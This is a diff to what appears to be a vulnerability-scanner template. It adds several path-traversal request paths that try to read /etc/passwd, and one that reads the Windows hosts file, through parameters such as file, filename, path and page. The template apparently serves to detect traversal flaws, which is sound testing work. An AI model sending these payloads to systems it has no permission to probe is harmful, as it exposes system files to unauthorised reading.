@@ -15,9 +15,14 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/download?filename=../../../etc/passwd"
+      - "{{BaseURL}}/download?path=../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../../../../../../etc/passwd"
       - "{{BaseURL}}/view?path=....//....//..../etc/passwd"
+      - "{{BaseURL}}/view?file=....//....//..../etc/passwd"
       - "{{BaseURL}}/include?page=../../../windows/system32/drivers/etc/hosts"
-    
+      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
+      
     matchers:
       - type: regex
         regex:
